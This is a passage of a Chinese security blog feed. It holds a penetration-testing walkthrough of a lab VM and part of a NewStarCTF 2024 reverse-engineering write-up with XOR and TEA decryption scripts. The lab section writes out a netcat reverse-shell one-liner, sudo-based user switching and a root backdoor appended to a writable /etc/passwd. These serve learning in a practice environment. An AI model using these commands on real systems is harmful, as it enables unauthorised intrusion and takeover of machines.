class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali]<br>└─# gobuster dir -u http://192.168.88.130 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 15 -b &quot;&quot; -s &quot;301,200,403&quot;<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:            http://192.168.88.130<br>[+] Method:         GET<br>[+] Threads:        15<br>[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Status codes:   200,403,301<br>[+] User Agent:     gobuster/3.6<br>[+] Timeout:        10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/examples             (Status: 200) [Size: 6937]<br>/welcome              (Status: 200) [Size: 13705]<br>/admin                (Status: 200) [Size: 42]<br>Progress: 6536 / 220561 (2.96%)[ERROR] Get &quot;http://192.168.88.130/2006&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br>[ERROR] Get &quot;http://192.168.88.130/crack&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br>[ERROR] Get &quot;http://192.168.88.130/about&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br>[ERROR] Get &quot;http://192.168.88.130/spacer&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br>[ERROR] Get &quot;http://192.168.88.130/search&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br>Progress: 7324 / 220561 (3.32%)[ERROR] Get &quot;http://192.168.88.130/reference&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br>/init                 (Status: 200) [Size: 5782]<br></code></pre></td></tr></table></figure><p>发现examples,welcome,admin,init目录</p><p>疑似一个业务页面，没找到可利用的价值</p><p>看下8080</p><h2 id="8080-HTTP"><a href="#8080-HTTP" class="headerlink" title="8080-HTTP"></a>8080-HTTP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">┌──(root㉿kali)-[/home/kali]<br>└─# gobuster dir -u http://192.168.88.130:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 15 -b &quot;&quot; -s &quot;301,200,403&quot;<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:            http://192.168.88.130:8080<br>[+] Method:         GET<br>[+] Threads:        15<br>[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Status codes:   301,200,403<br>[+] User Agent:     gobuster/3.6<br>[+] Timeout:        10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/images               (Status: 301) [Size: 324] [--&gt; http://192.168.88.130:8080/images/]<br>/help                 (Status: 301) [Size: 322] [--&gt; http://192.168.88.130:8080/help/]<br>/scripts              (Status: 301) [Size: 325] [--&gt; http://192.168.88.130:8080/scripts/]<br>/css                  (Status: 301) [Size: 321] [--&gt; http://192.168.88.130:8080/css/]<br>/wordpress            (Status: 301) [Size: 327] [--&gt; http://192.168.88.130:8080/wordpress/]<br>/development          (Status: 301) [Size: 329] [--&gt; http://192.168.88.130:8080/development/]<br>/manual               (Status: 301) [Size: 324] [--&gt; http://192.168.88.130:8080/manual/]<br>/js                   (Status: 301) [Size: 320] [--&gt; http://192.168.88.130:8080/js/]<br>/shell                (Status: 301) [Size: 323] [--&gt; http://192.168.88.130:8080/shell/]<br>/debug                (Status: 301) [Size: 323] [--&gt; http://192.168.88.130:8080/debug/]<br></code></pre></td></tr></table></figure><p>最显眼的就是 shell与debug了。访问看看是什么。</p><p><img src="https://img.dkdun.cn/v1/2024/12/50cae675aec0629b.png"></p><p>debug中发现一个终端。<br><img src="https://img.dkdun.cn/v1/2024/12/f4c80eb6d6002053.png"><br>且可以命令执行。</p><p>那么是否可以利用这个进行反弹shell？</p><p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.88.128 1234 &gt;/tmp/f</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/0027e4554b5a0bbe.png"></p><p>成功拿到shell。<br>但是是网站用户权限。需要进行提取。先来看看这个用户能干什么</p><h1 id="网站用户shell：www-data"><a href="#网站用户shell：www-data" class="headerlink" title="网站用户shell：www-data"></a>网站用户shell：www-data</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> -l</span><br>Matching Defaults entries for www-data on localhost:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User www-data may run the following commands on localhost:<br>    (brexit) NOPASSWD: /bin/bash<br><br></code></pre></td></tr></table></figure><p>发现可以以brexit用户的身份执行&#x2F;bin&#x2F;bash。那不是可以拿到brexit用户的shell吗？</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="www-data-brexit-提权"><a href="#www-data-brexit-提权" class="headerlink" title="www-data &#x3D;&gt; brexit 提权"></a>www-data &#x3D;&gt; brexit 提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> -l</span><br>Matching Defaults entries for www-data on localhost:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User www-data may run the following commands on localhost:<br>    (brexit) NOPASSWD: /bin/bash<br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> -u brexit /bin/bash</span><br>id<br>uid=1000(brexit) gid=1000(brexit) groups=1000(brexit),24(cdrom),30(dip),46(plugdev),108(lxd)<br></code></pre></td></tr></table></figure><p>成功获取，我们切换下终端。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">script -qc /bin/bash /dev/null<br>brexit@misdirection:/var/www/html/debug$ ^Z               <br>zsh: suspended  nc -vlnp 1234<br>                                                                                                                                                                                  <br>┌──(root㉿kali)-[/home/kali]<br>└─# stty raw -echo; fg       <br>[1]  + continued  nc -vlnp 1234<br>                               id<br>uid=1000(brexit) gid=1000(brexit) groups=1000(brexit),24(cdrom),30(dip),46(plugdev),108(lxd)<br>brexit@misdirection:/var/www/html/debug$ <br></code></pre></td></tr></table></figure><p>这样我们的终端就可以进行补全命令了</p><p><img src="https://img.dkdun.cn/v1/2024/12/69a7928e98052fb4.png"></p><p>发现使用sudo -l需要输入密码。emmmm，这里其实在最上面已经看到一种提权的方法了。</p><h2 id="lxd提权"><a href="#lxd提权" class="headerlink" title="lxd提权"></a>lxd提权</h2><p><a href="https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/">https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/</a><br>这里我不使用这个，我发现了另外的办法</p><h2 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h2><p>在我查看&#x2F;etc&#x2F;passwd的时候，发现brexit用户可以对&#x2F;etc&#x2F;passwd进行写入<br><img src="https://img.dkdun.cn/v1/2024/12/dc7222e5a8d49463.png"></p><p>那么这就是说我们可以构造一下写入一个拥有root权限的用户，然后进行登录。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">brexit@misdirection:/var/www/html/debug$ openssl passwd -1 123456<br><span class="hljs-meta prompt_">$</span><span class="language-bash">1$ZU44QtGO<span class="hljs-variable">$pk</span>.NradAoTb7vSq8FAEMd0</span><br></code></pre></td></tr></table></figure><p>然后对比&#x2F;etc&#x2F;passwd中的格式进行拼接<br>cxcxcx:$\1$ZU44QtGO$pk.NradAoTb7vSq8FAEMd0:0:0::&#x2F;root:&#x2F;bin&#x2F;bash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;cxcxcxcx:$1$ZU44QtGO$pk.NradAoTb7vSq8FAEMd0:0:0::/root:/bin/bash&quot; &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/7a58e120baf1e571.png"></p><p><img src="https://img.dkdun.cn/v1/2024/12/7a7e07a44fcfaaff.png"></p>]]></content>
    
    
    <categories>
      
      <category>cx的渗透日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week2</title>
    <link href="/2024/11/11/%E5%A4%8D%E7%8E%B02/"/>
    <url>/2024/11/11/%E5%A4%8D%E7%8E%B02/</url>
    
    <content type="html"><![CDATA[<p>有 Java 代码审计，好难，Java 我讨厌你qwq，但是我觉得这些题出得太好啦，复现完学到了很多！！！</p><span id="more"></span><h1 id="Pangbai-泰拉记（1）"><a href="#Pangbai-泰拉记（1）" class="headerlink" title="Pangbai 泰拉记（1）"></a>Pangbai 泰拉记（1）</h1><p>ida 打开反汇编查看，<code>flag</code> 和一个 <code>key</code> 异或</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  std::ostream *v0; <span class="hljs-comment">// rax</span><br>  std::ostream *v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+24h] [rbp+4h]</span><br><br>  <span class="hljs-built_in">j___CheckForDebuggerJustMyCode</span>(&amp;_6D<span class="hljs-number">15E8</span>DE_Pangbai____1__Pangbai____1__1_cpp);<br>  v0 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(std::cout, <span class="hljs-string">&quot;Use your debugger to discover the hidden flag!&quot;</span>);<br>  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v0, std::endl&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; ++i )<br>    flag[i] ^= key[i];<br>  v1 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(std::cout, <span class="hljs-string">&quot;Click on the flag to obtain?&quot;</span>);<br>  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v1, std::endl&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<br></code></pre></td></tr></table></figure><p>对 <code>key</code> 交叉引用能看见还没 <code>main0</code> 函数调用，进去看看</p><p><img src="https://img.dkdun.cn/v1/2024/12/15b058a1dd2841b6.png"></p><p>发现有两个函数 <code>IsDebuggerPresent()</code> 和 <code>CheckRemoteDebuggerPresent()</code>，这是两个反调试函数</p><p><img src="https://img.dkdun.cn/v1/2024/12/2d0da2054ad0d700.png"></p><p>对于 <code>CheckRemoteDebuggerPresent()</code> 函数：</p><p><code>kernel32</code> 的 <code>CheckRemoteDebuggerPresent() </code>函数用于检测指定进程是否正在被调试. <code>Remote</code> 指同一个机器中的不同进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">BOOL WINAPI CheckRemoteDebuggerPresent(<br>  _In_    HANDLE hProcess,<br>  _Inout_ PBOOL  pbDebuggerPresent<br>);<br></code></pre></td></tr></table></figure><p>如果说检测到正在被调试，那么 <code>pbDebuggerPresent</code> 指向的值会被设置为 <code>0xffffffff</code>。</p><p>对于这道题，调试一下可以看得出来流程，进程会跳转到右边这里，这里执行的是将 <code>key</code> 替换为不正确的 <code>key</code> ，所以可以将 <code>jz</code> 指令改为 <code>jnz</code> 指令，让程序跳转不了</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jz: </span><span class="hljs-keyword">Jump </span>if <span class="hljs-built_in">Zero</span>,零标志位 ZF=<span class="hljs-number">1</span> 时,<span class="hljs-keyword">jz </span>指令执行跳转<br><span class="hljs-keyword">jnz: </span><span class="hljs-keyword">Jump </span>if Not <span class="hljs-built_in">Zero</span>,零标志位 ZF=<span class="hljs-number">0</span> 时,<span class="hljs-keyword">jnz </span>指令执行跳转<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/82229bdabbecb98c.png"></p><p>然后进行调试</p><p><img src="https://img.dkdun.cn/v1/2024/12/c57b3908876d84ca.png"></p><p>提取数据，写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x69</span>,<br>        <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>,<br>        <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6D</span>,<br>        <span class="hljs-number">0x65</span>, <span class="hljs-number">0x3F</span>]<br>key = [<span class="hljs-number">0x05</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x5A</span>,<br>       <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x59</span>,<br>       <span class="hljs-number">0x26</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x09</span>,<br>       <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x42</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>):<br>    flag[i] ^= key[i]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag[i]), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="drink-tea"><a href="#drink-tea" class="headerlink" title="drink_tea"></a>drink_tea</h1><p>先读一遍流程，输入长度为 32 的字符串，进入 <code>sub_140001180</code>，然后再比较</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+20h] [rbp-28h]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp+28h] [rbp-20h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please Input: \n&quot;</span>);<br>  <span class="hljs-built_in">sub_140001120</span>(<span class="hljs-string">&quot;%32s&quot;</span>, byte_140004700);<br>  v5 = <span class="hljs-number">-1</span>i64;<br>  <span class="hljs-keyword">do</span><br>    ++v5;<br>  <span class="hljs-keyword">while</span> ( byte_140004700[v5] );<br>  <span class="hljs-keyword">if</span> ( v5 == dword_140004078 )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; dword_140004078; i += <span class="hljs-number">8</span> )<br>      <span class="hljs-built_in">sub_140001180</span>(&amp;byte_140004700[i], aWelcometonewst);<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">memcmp</span>(byte_140004700, &amp;unk_140004080, dword_140004078) )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Right! \n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong! \n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入 <code>sub_140001180</code> 函数查看</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">__int64</span> __fastcall sub_140001180(unsigned int *<span class="hljs-built_in">a1</span>, _DWORD *<span class="hljs-built_in">a2</span>)<br>&#123;<br>  __int64 result<span class="hljs-comment">; // rax</span><br>  unsigned int <span class="hljs-built_in">v3</span><span class="hljs-comment">; // [rsp+0h] [rbp-38h]</span><br>  unsigned int <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+4h] [rbp-34h]</span><br>  int <span class="hljs-built_in">v5</span><span class="hljs-comment">; // [rsp+8h] [rbp-30h]</span><br>  unsigned int i<span class="hljs-comment">; // [rsp+Ch] [rbp-2Ch]</span><br><br>  <span class="hljs-built_in">v3</span> = *<span class="hljs-built_in">a1</span><span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v4</span> = <span class="hljs-built_in">a1</span>[<span class="hljs-number">1</span>]<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v5</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>  for ( i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 0x20; ++i )</span><br>  &#123;<br>    <span class="hljs-built_in">v5</span> -= <span class="hljs-number">1640531527</span><span class="hljs-comment">;</span><br>    <span class="hljs-built_in">v3</span> += (<span class="hljs-built_in">a2</span>[<span class="hljs-number">1</span>] + (<span class="hljs-built_in">v4</span> &gt;&gt; <span class="hljs-number">5</span>)) ^ (<span class="hljs-built_in">v5</span> + <span class="hljs-built_in">v4</span>) ^ (*<span class="hljs-built_in">a2</span> + <span class="hljs-number">16</span> * <span class="hljs-built_in">v4</span>)<span class="hljs-comment">;</span><br>    <span class="hljs-built_in">v4</span> += (<span class="hljs-built_in">a2</span>[<span class="hljs-number">3</span>] + (<span class="hljs-built_in">v3</span> &gt;&gt; <span class="hljs-number">5</span>)) ^ (<span class="hljs-built_in">v5</span> + <span class="hljs-built_in">v3</span>) ^ (<span class="hljs-built_in">a2</span>[<span class="hljs-number">2</span>] + <span class="hljs-number">16</span> * <span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>  &#125;<br>  *<span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>  result = <span class="hljs-number">4</span>i64<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">a1</span>[<span class="hljs-number">1</span>] = <span class="hljs-built_in">v4</span><span class="hljs-comment">;</span><br>  return result<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>看到这个加密流程就能发现是 tea 算法加密找到<code>key</code> 和输入的值直接逆</p><p><img src="https://img.dkdun.cn/v1/2024/12/22dcddbe3c87348b.png"></p><p>脚本如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span> <span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0xC6EF3720</span>, i;  <br>    <span class="hljs-type">uint32_t</span> delta=<span class="hljs-number">0x9e3779b9</span>;                     <br>    <span class="hljs-type">uint32_t</span> k0=k[<span class="hljs-number">0</span>], k1=k[<span class="hljs-number">1</span>], k2=k[<span class="hljs-number">2</span>], k3=k[<span class="hljs-number">3</span>];   <br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">32</span>; i++) &#123;                         <br>        v1 -= ((v0&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="hljs-number">5</span>) + k1);<br>        sum -= delta;<br>    &#125;                                              <br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i,j;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> flag[] = &#123;<span class="hljs-number">0x78</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x85</span>,<br><span class="hljs-number">0x59</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x07</span>, <br><span class="hljs-number">0xA8</span>,<span class="hljs-number">0xB9</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x24</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> keys[]=<span class="hljs-string">&quot;WelcomeToNewStar&quot;</span>;<br><br>    <span class="hljs-type">uint32_t</span> *v = (<span class="hljs-type">uint32_t</span>*)flag;<br>    <span class="hljs-type">uint32_t</span> *k = (<span class="hljs-type">uint32_t</span>*)keys;<br><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i+=<span class="hljs-number">2</span>)&#123;<span class="hljs-comment">//每8个字节(2个 uint32)解密</span><br>        decrypt(v+i,k);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">32</span>;j++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,flag[j]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ezencrypt"><a href="#ezencrypt" class="headerlink" title="ezencrypt"></a>ezencrypt</h1><p>先查看 <code>MainActivity</code> 函数发现有加密逻辑，<code>Enc enc = new Enc(tx)</code>，那就去 <code>Enc</code> 函数看看</p><p><img src="https://img.dkdun.cn/v1/2024/12/2d292afff47f2193.png"></p><p><code>Enc</code> 的构造函数里进行第一次加密，<code>ECB</code> 模式的 <code>AES</code> 加密，密钥是 <code>MainActivity</code> 的 <code>title</code></p><p><code>doEncCheck</code> 函数进行加密数据检查，发现有 <code>native</code> 关键字，在 Java 中，<code>native </code>关键字用于声明一个方法是由本地代码（通常是C或C++）实现的，所以说明函数是 C&#x2F;C++ 编写的，所以主体在 so 文件，进行 so 提取</p><p><img src="https://img.dkdun.cn/v1/2024/12/f133efd830a5c77f.png"></p><p>IDA 打开 so 文件，找到 <code>doEncCheck</code> ，点进去查看</p><p><img 